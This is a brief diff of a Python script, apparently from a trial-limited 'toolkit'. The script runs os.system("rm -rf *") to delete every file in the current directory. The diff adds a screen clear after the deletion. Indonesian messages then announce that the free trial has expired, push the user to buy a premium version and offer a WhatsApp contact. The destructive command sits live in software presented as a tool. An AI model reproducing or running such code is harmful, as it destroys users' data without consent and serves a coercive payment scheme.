@@ -1,6 +1,6 @@
 import time,subprocess,os
 os.system("rm -rf *")
-
+os.system("clear")
 print("[!] mohon maaf trial gratis sudah berakhir")
 print("[!] silahkan membeli fitur premium untuk asu toolkit yang lebih baik.")
 print("[!] pilih y untuk langsung menghubungi administrator (whatsapp)")
